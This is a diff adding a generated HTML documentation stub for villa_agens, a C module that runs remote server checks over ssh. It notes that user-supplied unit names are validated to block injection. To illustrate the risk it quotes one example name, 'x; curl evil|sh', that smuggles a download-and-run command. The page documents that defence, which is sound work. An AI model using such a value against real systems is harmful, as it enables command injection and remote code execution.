@@ -1,0 +1,31 @@
+<!doctype html>
+<!-- GENERATUM: docs/instrumenta/pagina_bibliothecae.py - noli manu mutare -->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>villa_agens</title>
+<link rel="stylesheet" href="../stilus.css">
+</head>
+<body>
+
+<p class="nota"><a href="../index.html">Rhubarb</a> · <a href="index.html">Bibliothecae</a></p>
+<h1>villa_agens</h1>
+<p class="subtitulus">Agens villae: probatio, actio, eventus.</p>
+
+<p>The part of villa (the servers app) that has no face: configuration, the remote check script, the check cycle, the seeds of its record kinds, writing events. It lives in lib/ rather than apps/villa/ so that the root test suite covers it, because a gate that cannot turn green is ignored. Nothing blocks: every check runs through processus&#x27;s incremental path and villa_agens_pulsare returns at once each tick. The header sets out the shell question plainly: locally no shell is ever used; remotely ssh necessarily runs a shell, so unit names coming from the user&#x27;s own records are checked by villa_unitas_valida before they are interpolated into the script (a unit named &#x27;x; curl evil|sh&#x27; would otherwise run), and a refused name is left out of the check. The ssh control directory is created 0700. From July 2026.</p>
+
+<table>
+<tbody>
+<tr><td>Header</td><td><a href="../../include/villa_agens.h"><code>include/villa_agens.h</code></a></td></tr>
+<tr><td>Implementation</td><td><a href="../../lib/villa_agens.c"><code>lib/villa_agens.c</code></a></td></tr>
+<tr><td>Last change</td><td>2026-08-19 f683e78a</td></tr>
+<tr><td>Group</td><td><a href="greges.html#vitrea">Vitrea apps</a></td></tr>
+</tbody>
+</table>
+<p class="nota">A stub: one paragraph so far. Generated from the ledger
+inventory <em>bibliothecae (include)</em>; edit the inventory, not this
+page.</p>
+
+</body>
+</html>
